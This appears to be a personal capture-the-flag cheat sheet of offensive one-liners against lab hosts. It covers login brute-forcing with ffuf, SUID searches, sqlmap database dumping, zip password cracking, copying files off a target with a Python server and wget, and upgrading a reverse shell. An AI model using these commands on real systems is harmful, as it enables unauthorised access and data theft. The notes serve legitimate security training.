
### bruteforce using ffuf

`ffuf -w <user_file>:W1,<password_file>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -fc 200`

eg. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200`

### vscode:

`shift + command + F` searches for selected text in all files

### generic recursive search for a file, no error flood

`find / -name flag.txt 2>/dev/null`


### history cut to get only the commands

`history | cut -d " " -f 5`

### find SUID binaries unprivileged

`find / -user root -perm /4000 2>/dev/null`

usually suffices to find SUID binaries (does not use sudo - eg. sudo -l )

### gobuster no tls verification - just disable it

`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x .js,.php,.txt -k`

### ftp get all files

`mget *`

### steganography file extraction #stego

`binwalk -e <file>`

### stego password protected file

first verify there is something `steghide info cute-alien.jpg`

then extract it `steghide extract -sf cute-alien.jpg`

### zip password bruteforce

`zip2john 8702.zip > zip.hash && john zip.hash`

### download file from target

target: `python3 -m http.server 8000`

attacker: `wget http://TARGET_IP:8000/flag.txt`

does not matter where the file is

### SQL injection when it does not work but should

1) capture the request in burpsuite
2) go to burp's http history and save it as xml
3) sqlmap -r request.xml [+ whatever options you want - eg. --dbs then --tables then --dump]

### bin -> dec -> hex -> ascii conversion does not work in CyberChef

do it in an online converter or python - eg.  you do this:

```python
# not str -> str like CyberChef does but working with numbers
binary = str('binary_number') # bin
decimal = int(b, 2) # bin -> dec
# now you can continue online or in cyberchef
# or python:
hexadecimal = hex(d)[2:] # bin -> dec -> hex
result = bytes.fromhex(h).decode('ASCII') # result
print(result)
```

### four character lowercase alpha passwords from rockyou

`cat /usr/share/wordlists/rockyou.txt | egrep '^[a-z]{4}$' > four.txt`

### upgrade shell

1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2) Ctrl + z
3) `stty raw -echo; fg`

### web hacked - revshell but where next?
try `/var/www/html` to find some config files

### rev.py

just copy the revshells.com python#2 shell and format it normally
(I can't put it here as it would get flagged as malware)

### AD cheatsheet (not mine)

[AD cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

### RDP

`xfreerdp /u:Administrator /p:password /v:111.222.333.444 /dynamic-resolution`

### powershell - how to survive powershell

`gal` or `Get-Alias` to see all aliases (commands that are understandable for UNIX users)
scroll through the list and pray to all gods you know, that you find what you need

else, feel its wrath and a cold presence will form behind your back. Do not look behind you. If you do, your eyes will have the windows logo burned into your retinas and you will have to say "I invoke command ..." for every task of your day. If you fail to do so, you will leave this reality for a place far more desolate than anything you've experienced. No one knows what happens to those who do, but it sure is not pleasant.

anyways . . .



